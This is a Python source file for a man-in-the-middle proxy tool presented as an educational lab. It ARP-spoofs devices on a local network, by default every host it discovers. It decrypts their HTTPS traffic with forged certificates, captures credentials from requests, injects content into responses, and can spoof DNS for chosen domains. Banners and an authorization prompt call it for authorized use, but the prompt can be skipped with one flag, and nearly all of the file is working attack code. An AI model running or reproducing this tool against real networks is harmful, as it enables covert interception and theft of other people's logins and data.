"""
NEON-SHIELD MITM Proxy Lab — Auto-Mode Only (Educational Use)

This is a POWERFUL demonstration tool for authorized security research &
education ONLY. It performs active MITM attacks on local networks:
- ARP spoofing to intercept traffic from other devices
- TLS decryption to read HTTPS traffic
- Content injection, credential capture, DNS spoofing
- Traffic inspection & logging

DO NOT use this against anyone's network/devices without explicit authorization.
See the README for legal/ethical guidelines and the in-tool disclaimers.
"""
import argparse
import atexit
import json
import os
import signal
import socket
import ssl
import sys
import threading
import time
from ca import CertificateAuthority
from content_rules import apply_content_rules, parse_response_meta
from creds_capture import capture_credentials
from traffic_log import TrafficLog

HOST = "0.0.0.0"
TRANSPARENT_HTTP_PORT = 8081
TRANSPARENT_HTTPS_PORT = 8443
DASHBOARD_PORT = 8080
CONTROL_PANEL_PORT = 7070
CONTROL_PANEL_HOST = "127.0.0.1"

DASHBOARD_HTML_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "dashboard.html"
)
CONTROL_PANEL_HTML_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "control_panel.html"
)

try:
    with open(DASHBOARD_HTML_PATH, "r", encoding="utf-8") as f:
        DASHBOARD_HTML = f.read()
except Exception as e:
    DASHBOARD_HTML = f"<html><body>Error loading dashboard: {e}</body></html>"

try:
    with open(CONTROL_PANEL_HTML_PATH, "r", encoding="utf-8") as f:
        CONTROL_PANEL_HTML = f.read()
except Exception as e:
    CONTROL_PANEL_HTML = f"<html><body>Error loading control panel: {e}</body></html>"

ca = CertificateAuthority()

stats_lock = threading.Lock()
total_connections = 0
total_bytes_intercepted = 0
spoofed_targets = []
dns_redirect_map = {}

traffic_log = TrafficLog(maxlen=500)
creds_log = TrafficLog(maxlen=200)

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

LOCAL_IP = get_local_ip()

def split_headers_body(data):
    header_end = data.find(b"\r\n\r\n")
    if header_end == -1:
        return data.split(b"\r\n"), b""
    return data[:header_end].split(b"\r\n"), data[header_end + 4:]

def rebuild_header_block(header_lines_after_request_line):
    raw_req_lines = []
    for line in header_lines_after_request_line:
        line_str = line.decode("utf-8", errors="ignore")
        low = line_str.lower()
        if low.startswith("connection:"):
            raw_req_lines.append("Connection: close")
        elif low.startswith("proxy-connection:"):
            pass
        elif low.startswith("accept-encoding:"):
            raw_req_lines.append("Accept-Encoding: identity")
        else:
            raw_req_lines.append(line_str)

    if not any(l.lower().startswith("connection:") for l in raw_req_lines):
        raw_req_lines.append("Connection: close")

    return "\r\n".join(raw_req_lines)

def get_header_value(header_lines, name):
    prefix = (name + ":").lower()
    for line in header_lines:
        line_str = line.decode("utf-8", errors="ignore")
        if line_str.lower().startswith(prefix):
            return line_str.split(":", 1)[1].strip()
    return None

def extract_sni(client_hello):
    try:
        if len(client_hello) < 5 or client_hello[0] != 0x16:
            return None
        pos = 5
        if client_hello[pos] != 0x01:
            return None
        pos += 4
        pos += 2 + 32

        session_id_len = client_hello[pos]
        pos += 1 + session_id_len

        cipher_suites_len = int.from_bytes(client_hello[pos:pos + 2], "big")
        pos += 2 + cipher_suites_len

        compression_methods_len = client_hello[pos]
        pos += 1 + compression_methods_len

        if pos + 2 > len(client_hello):
            return None
        extensions_len = int.from_bytes(client_hello[pos:pos + 2], "big")
        pos += 2
        extensions_end = pos + extensions_len

        while pos + 4 <= extensions_end and pos + 4 <= len(client_hello):
            ext_type = int.from_bytes(client_hello[pos:pos + 2], "big")
            ext_len = int.from_bytes(client_hello[pos + 2:pos + 4], "big")
            ext_start = pos + 4
            if ext_type == 0x00:
                sni_pos = ext_start + 2
                name_type = client_hello[sni_pos]
                if name_type == 0x00:
                    name_len = int.from_bytes(client_hello[sni_pos + 1:sni_pos + 3], "big")
                    name = client_hello[sni_pos + 3:sni_pos + 3 + name_len]
                    return name.decode("utf-8", errors="ignore")
            pos = ext_start + ext_len
        return None
    except Exception:
        return None

def send_simple_response(client_conn, status_code, status_message, body_bytes):
    response_headers = [
        f"HTTP/1.1 {status_code} {status_message}".encode("utf-8"),
        b"Content-Type: text/plain",
        f"Content-Length: {len(body_bytes)}".encode("utf-8"),
        b"Connection: close"
    ]
    response = b"\r\n".join(response_headers) + b"\r\n\r\n" + body_bytes
    client_conn.sendall(response)

def handle_transparent_http(client_conn, client_addr):
    try:
        request_data = client_conn.recv(8192)
        if not request_data:
            return

        header_lines, body = split_headers_body(request_data)
        request_line = header_lines[0].decode("utf-8", errors="ignore")
        parts = request_line.split()
        if len(parts) < 3:
            return
        method, path, version = parts

        host_header = get_header_value(header_lines, "host")
        if not host_header:
            return
        domain = host_header.split(":")[0]

        print(f"[HTTP] {method} {domain}{path} from {client_addr[0]}")

        rebuilt_headers = rebuild_header_block(header_lines[1:])
        rebuilt_request = f"{method} {path} {version}\r\n{rebuilt_headers}\r\n\r\n".encode("utf-8")
        rebuilt_request += body

        upstream_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        upstream_conn.connect((domain, 80))
        upstream_conn.sendall(rebuilt_request)

        response_bytes = bytearray()
        while True:
            chunk = upstream_conn.recv(8192)
            if not chunk:
                break
            response_bytes.extend(chunk)
        upstream_conn.close()

        # Log to traffic log
        status_code, content_type, body_len = parse_response_meta(bytes(response_bytes))
        with stats_lock:
            global total_bytes_intercepted
            total_bytes_intercepted += len(response_bytes)
        traffic_log.add({
            "protocol": "http",
            "method": method,
            "domain": domain,
            "path": path,
            "status": status_code,
            "content_type": content_type,
            "size": body_len,
            "source_ip": client_addr[0],
        })

        # Capture credentials
        creds = capture_credentials(header_lines, body)
        for cred in creds:
            cred["domain"] = domain
            cred["source_ip"] = client_addr[0]
            creds_log.add(cred)

        # Apply content rules
        modified_response, rule_applied = apply_content_rules(bytes(response_bytes), path)
        client_conn.sendall(modified_response)

    except Exception as e:
        print(f"[HTTP Error] {client_addr}: {e}")

def handle_transparent_https(client_conn, client_addr):
    ssl_client_conn = None
    try:
        client_hello = client_conn.recv(8192, socket.MSG_PEEK)
        if not client_hello:
            return

        domain = extract_sni(client_hello)
        if not domain:
            print(f"[HTTPS] Could not extract SNI for {client_addr[0]}; dropping")
            return

        print(f"[HTTPS] TLS handshake for {domain} from {client_addr[0]}")

        try:
            cert_path, key_path = ca.get_certificate(domain)
        except Exception as e:
            print(f"[CA Error] Failed to generate cert for {domain}: {e}")
            return

        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=cert_path, keyfile=key_path)
        try:
            context.set_alpn_protocols(["http/1.1"])
        except Exception:
            pass

        try:
            ssl_client_conn = context.wrap_socket(client_conn, server_side=True)
        except Exception as e:
            print(f"[SSL Error] Handshake failed for {domain}: {e}")
            return

        decrypted_request = ssl_client_conn.recv(8192)
        if not decrypted_request:
            return

        header_lines, body = split_headers_body(decrypted_request)
        request_line = header_lines[0].decode("utf-8", errors="ignore")
        parts = request_line.split()
        if len(parts) < 3:
            return
        method, path, version = parts

        print(f"[HTTPS] {method} {domain}{path}")

        rebuilt_headers = rebuild_header_block(header_lines[1:])
        rebuilt_request = f"{method} {path} {version}\r\n{rebuilt_headers}\r\n\r\n".encode("utf-8")
        rebuilt_request += body

        upstream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_upstream_context = ssl.create_default_context()
        ssl_upstream_context.check_hostname = False
        ssl_upstream_context.verify_mode = ssl.CERT_NONE
        try:
            ssl_upstream_context.set_alpn_protocols(["http/1.1"])
        except Exception:
            pass

        ssl_upstream_conn = ssl_upstream_context.wrap_socket(upstream_socket, server_hostname=domain)
        ssl_upstream_conn.connect((domain, 443))
        ssl_upstream_conn.sendall(rebuilt_request)

        response_bytes = bytearray()
        while True:
            chunk = ssl_upstream_conn.recv(8192)
            if not chunk:
                break
            response_bytes.extend(chunk)
        ssl_upstream_conn.close()

        # Log to traffic log
        status_code, content_type, body_len = parse_response_meta(bytes(response_bytes))
        with stats_lock:
            total_bytes_intercepted += len(response_bytes)
        traffic_log.add({
            "protocol": "https",
            "method": method,
            "domain": domain,
            "path": path,
            "status": status_code,
            "content_type": content_type,
            "size": body_len,
            "source_ip": client_addr[0],
        })

        # Capture credentials from the DECRYPTED request
        creds = capture_credentials(header_lines, body)
        for cred in creds:
            cred["domain"] = domain
            cred["source_ip"] = client_addr[0]
            creds_log.add(cred)

        # Apply content rules
        modified_response, rule_applied = apply_content_rules(bytes(response_bytes), path)
        ssl_client_conn.sendall(modified_response)

    except Exception as e:
        print(f"[HTTPS Error] {client_addr}: {e}")
    finally:
        try:
            (ssl_client_conn or client_conn).close()
        except Exception:
            pass

def handle_dashboard_request(client_conn, method, path, header_lines, client_addr):
    """Handles requests to the LAN-facing dashboard (8080)."""
    try:
        path = path.split("?")[0]

        if path == "/ca.crt" or path == "/ca":
            cert_path = ca.ca_cert_path
            if os.path.exists(cert_path):
                with open(cert_path, "rb") as f:
                    cert_data = f.read()
                response_headers = [
                    b"HTTP/1.1 200 OK",
                    b"Content-Type: application/x-x509-ca-cert",
                    b"Content-Disposition: attachment; filename=\"neon_shield_ca.crt\"",
                    f"Content-Length: {len(cert_data)}".encode("utf-8"),
                    b"Connection: close",
                ]
                response = b"\r\n".join(response_headers) + b"\r\n\r\n" + cert_data
                client_conn.sendall(response)
            else:
                send_simple_response(client_conn, 404, "Not Found", b"CA cert not found.")

        elif path == "/stats":
            with stats_lock:
                stats = {
                    "total_connections": total_connections,
                    "total_bytes_intercepted": total_bytes_intercepted,
                    "traffic_log_count": traffic_log.count(),
                    "creds_log_count": creds_log.count(),
                    "spoofed_targets": list(spoofed_targets),
                    "dns_redirect_domains": list(dns_redirect_map.keys()),
                }
            stats_json = json.dumps(stats).encode("utf-8")
            response_headers = [
                b"HTTP/1.1 200 OK",
                b"Content-Type: application/json",
                f"Content-Length: {len(stats_json)}".encode("utf-8"),
                b"Connection: close",
                b"Access-Control-Allow-Origin: *",
            ]
            response = b"\r\n".join(response_headers) + b"\r\n\r\n" + stats_json
            client_conn.sendall(response)

        elif path == "/" or path == "/index.html":
            html = DASHBOARD_HTML.replace("{LOCAL_IP}", LOCAL_IP).replace("{CONTROL_PANEL_URL}",
                f"http://{CONTROL_PANEL_HOST}:{CONTROL_PANEL_PORT}/")
            html_bytes = html.encode("utf-8")
            response_headers = [
                b"HTTP/1.1 200 OK",
                b"Content-Type: text/html; charset=utf-8",
                f"Content-Length: {len(html_bytes)}".encode("utf-8"),
                b"Connection: close",
            ]
            response = b"\r\n".join(response_headers) + b"\r\n\r\n" + html_bytes
            client_conn.sendall(response)

        else:
            send_simple_response(client_conn, 404, "Not Found", b"Not found.")

    except Exception as e:
        print(f"[Dashboard Error] {e}")

def handle_control_panel_request(client_conn, method, path, header_lines, client_addr):
    """Handles requests to the loopback-only control panel (127.0.0.1:7070)."""
    try:
        path = path.split("?")[0]

        if path == "/api/traffic":
            items = traffic_log.snapshot(limit=200)
            data = json.dumps({"entries": items}).encode("utf-8")
            response_headers = [
                b"HTTP/1.1 200 OK",
                b"Content-Type: application/json",
                f"Content-Length: {len(data)}".encode("utf-8"),
                b"Connection: close",
            ]
            response = b"\r\n".join(response_headers) + b"\r\n\r\n" + data
            client_conn.sendall(response)

        elif path == "/api/creds":
            items = creds_log.snapshot(limit=200)
            data = json.dumps({"entries": items}).encode("utf-8")
            response_headers = [
                b"HTTP/1.1 200 OK",
                b"Content-Type: application/json",
                f"Content-Length: {len(data)}".encode("utf-8"),
                b"Connection: close",
            ]
            response = b"\r\n".join(response_headers) + b"\r\n\r\n" + data
            client_conn.sendall(response)

        elif path == "/" or path == "/index.html":
            html_bytes = CONTROL_PANEL_HTML.encode("utf-8")
            response_headers = [
                b"HTTP/1.1 200 OK",
                b"Content-Type: text/html; charset=utf-8",
                f"Content-Length: {len(html_bytes)}".encode("utf-8"),
                b"Connection: close",
            ]
            response = b"\r\n".join(response_headers) + b"\r\n\r\n" + html_bytes
            client_conn.sendall(response)

        else:
            send_simple_response(client_conn, 404, "Not Found", b"Not found.")

    except Exception as e:
        print(f"[ControlPanel Error] {e}")

def run_listener(host, port, handler, label):
    """Generic accept loop for HTTP listeners."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((host, port))
    except Exception as e:
        print(f"[Error] Failed to bind {label} on {host}:{port}: {e}")
        return

    server.listen(100)
    print(f"[{label}] Listening on {host}:{port}")
    try:
        while True:
            client_conn, client_addr = server.accept()
            t = threading.Thread(target=handler, args=(client_conn, client_addr))
            t.daemon = True
            t.start()
    except OSError:
        pass
    finally:
        server.close()

def handle_dashboard_client(client_conn, client_addr):
    try:
        request_data = client_conn.recv(4096)
        if not request_data:
            return
        header_lines, _ = split_headers_body(request_data)
        request_line = header_lines[0].decode("utf-8", errors="ignore")
        parts = request_line.split()
        if len(parts) >= 3:
            method, path, version = parts[0], parts[1], parts[2]
            handle_dashboard_request(client_conn, method, path, header_lines, client_addr)
    except Exception as e:
        print(f"[Dashboard] {e}")
    finally:
        try:
            client_conn.close()
        except Exception:
            pass

def handle_control_panel_client(client_conn, client_addr):
    try:
        request_data = client_conn.recv(4096)
        if not request_data:
            return
        header_lines, _ = split_headers_body(request_data)
        request_line = header_lines[0].decode("utf-8", errors="ignore")
        parts = request_line.split()
        if len(parts) >= 3:
            method, path, version = parts[0], parts[1], parts[2]
            handle_control_panel_request(client_conn, method, path, header_lines, client_addr)
    except Exception as e:
        print(f"[ControlPanel] {e}")
    finally:
        try:
            client_conn.close()
        except Exception:
            pass

AUTHORIZATION_BANNER = """
╔════════════════════════════════════════════════════════════════════╗
║                  ⚡ NEON-SHIELD MITM PROXY LAB ⚡                  ║
║                   FOR EDUCATIONAL PURPOSES ONLY                    ║
╠════════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  This tool performs ACTIVE MITM ATTACKS on your local network:    ║
║  • ARP spoofing to intercept traffic from other devices           ║
║  • TLS decryption to read HTTPS traffic                           ║
║  • Content injection, credential capture, DNS spoofing            ║
║  • Full traffic inspection & logging                              ║
║                                                                    ║
║  THIS IS ILLEGAL without explicit authorization. You confirm:     ║
║                                                                    ║
║  ✓ Every device you're targeting is owned by you OR you have      ║
║    explicit written authorization from the owner/operator.        ║
║  ✓ This network is your own OR you're authorized to test it.      ║
║  ✓ You understand this tool is FOR EDUCATION & AUTHORIZED         ║
║    security research only, not for malicious use.                 ║
║  ✓ Unauthorized MITM attacks violate computer fraud, wiretap,     ║
║    and privacy laws in most jurisdictions.                        ║
║                                                                    ║
║  https://github.com/[your-repo] — See README.md for full docs     ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝
"""

def confirm_authorization(skip_prompt):
    print(AUTHORIZATION_BANNER)
    if skip_prompt:
        return True
    try:
        response = input("Type 'YES I UNDERSTAND' to confirm: ")
    except EOFError:
        return False
    return response.strip() == "YES I UNDERSTAND"

def run_auto_mode(args):
    if os.name != "posix" or not sys.platform.startswith("linux"):
        print("[Error] NEON-SHIELD requires Linux (uses iptables + raw sockets).")
        sys.exit(1)

    if os.geteuid() != 0:
        print("[Error] NEON-SHIELD requires root (ARP spoofing + iptables).")
        sys.exit(1)

    if not confirm_authorization(args.yes):
        print("[Auth] Authorization not confirmed. Aborting.")
        sys.exit(1)

    from netdiscover import get_default_iface_and_gateway, scan_subnet
    from arpspoof import ArpSpoofer
    from iptables_ctl import TransparentRedirect

    iface, gateway_ip, local_ip, cidr = get_default_iface_and_gateway()
    if args.iface:
        iface = args.iface

    if args.targets:
        target_ips = [t.strip() for t in args.targets.split(",") if t.strip()]
    else:
        print(f"[Discover] Scanning {cidr} on {iface}...")
        hosts = scan_subnet(iface, cidr)
        target_ips = [h["ip"] for h in hosts if h["ip"] not in (gateway_ip, local_ip)]
        print(f"[Discover] Found {len(target_ips)} device(s): {', '.join(target_ips)}")

    if not target_ips:
        print("[Error] No target devices found.")
        sys.exit(1)

    dns_port = None
    dns_map = {}
    if args.dns_redirect:
        # Parse --dns-redirect domain1:ip1,domain2:ip2
        for pair in args.dns_redirect.split(","):
            if ":" in pair:
                domain, ip = pair.split(":", 1)
                dns_map[domain.strip()] = ip.strip()
        if dns_map:
            dns_port = 5353  # Local DNS spoofer port
            global dns_redirect_map
            dns_redirect_map = dns_map

    spoofer = ArpSpoofer(iface, gateway_ip, target_ips)
    redirect = TransparentRedirect(TRANSPARENT_HTTP_PORT, TRANSPARENT_HTTPS_PORT, dns_port=dns_port)

    cleanup_done = threading.Event()

    def cleanup():
        if cleanup_done.is_set():
            return
        cleanup_done.set()
        print("\n[Cleanup] Restoring ARP tables and firewall rules...")
        try:
            spoofer.stop()
        except Exception as e:
            print(f"[Cleanup] ARP warning: {e}")
        try:
            redirect.teardown()
        except Exception as e:
            print(f"[Cleanup] Firewall warning: {e}")

    atexit.register(cleanup)

    def handle_signal(signum, frame):
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    spoofer.start()
    redirect.setup()

    if dns_map:
        from dns_spoof import DnsSpoofer
        dns_spoofer = DnsSpoofer(dns_port, dns_map, (gateway_ip, 53))
        dns_spoofer.start()

    global total_connections, spoofed_targets
    with stats_lock:
        spoofed_targets = target_ips

    # Start transparent listeners
    threading.Thread(
        target=run_listener,
        args=(HOST, TRANSPARENT_HTTP_PORT, handle_transparent_http, "HTTP-Transparent"),
        daemon=True,
    ).start()
    threading.Thread(
        target=run_listener,
        args=(HOST, TRANSPARENT_HTTPS_PORT, handle_transparent_https, "HTTPS-Transparent"),
        daemon=True,
    ).start()

    # Start LAN-facing dashboard
    threading.Thread(
        target=run_listener,
        args=(HOST, DASHBOARD_PORT, handle_dashboard_client, "Dashboard"),
        daemon=True,
    ).start()

    # Start loopback-only control panel
    threading.Thread(
        target=run_listener,
        args=(CONTROL_PANEL_HOST, CONTROL_PANEL_PORT, handle_control_panel_client, "ControlPanel"),
        daemon=True,
    ).start()

    print(f"""
╔════════════════════════════════════════════════════════════════════╗
║              🔴 NEON-SHIELD ACTIVE (Educational Mode) 🔴           ║
╠════════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  Intercept Mode:       ARP Spoofing + Transparent Proxy            ║
║  Target Devices:       {len(target_ips)} ({''.join(target_ips[:1]) + '...' if len(target_ips) > 3 else ', '.join(target_ips)})
║  LAN Dashboard:        http://{LOCAL_IP}:{DASHBOARD_PORT}/           ║
║  Control Panel:        http://{CONTROL_PANEL_HOST}:{CONTROL_PANEL_PORT}/ (localhost only)     ║
║  CA Certificate:       http://{LOCAL_IP}:{DASHBOARD_PORT}/ca.crt     ║
║                                                                    ║
║  ⚠️  REMEMBER: This is an authorized-use-only tool for            ║
║  demonstrating why HTTPS and network security matter.             ║
║                                                                    ║
║  Press Ctrl+C to stop and restore all settings.                   ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝
""")

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

def parse_args():
    parser = argparse.ArgumentParser(
        description="NEON-SHIELD MITM Proxy Lab (Educational Use Only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EDUCATIONAL PURPOSE ONLY. Unauthorized MITM attacks are illegal.
See README.md for full legal/ethical disclaimer and usage guidelines.

EXAMPLE (your own 3-device home lab, with HTML banner injection):
  sudo python3 proxy.py --targets 192.168.1.50,192.168.1.51,192.168.1.52 -y

EXAMPLE (with DNS spoofing to demo phishing risk):
  sudo python3 proxy.py \\
    --targets 192.168.1.50 \\
    --dns-redirect "example.com:192.168.1.1" \\
    -y
""",
    )
    parser.add_argument(
        "--targets",
        help="Comma-separated target IPs. Default: auto-discover all live hosts on subnet."
    )
    parser.add_argument("--iface", help="Network interface. Default: auto-detect.")
    parser.add_argument(
        "--dns-redirect",
        help="Optional DNS spoofing (domain:ip,domain:ip). Redirects only listed domains to your IP. "
             "Example: --dns-redirect 'example.com:192.168.1.1'",
    )
    parser.add_argument(
        "-y", "--yes", action="store_true",
        help="Skip interactive authorization confirmation (implies you understand the risks)."
    )
    return parser.parse_args()

def main():
    args = parse_args()
    run_auto_mode(args)

if __name__ == "__main__":
    main()
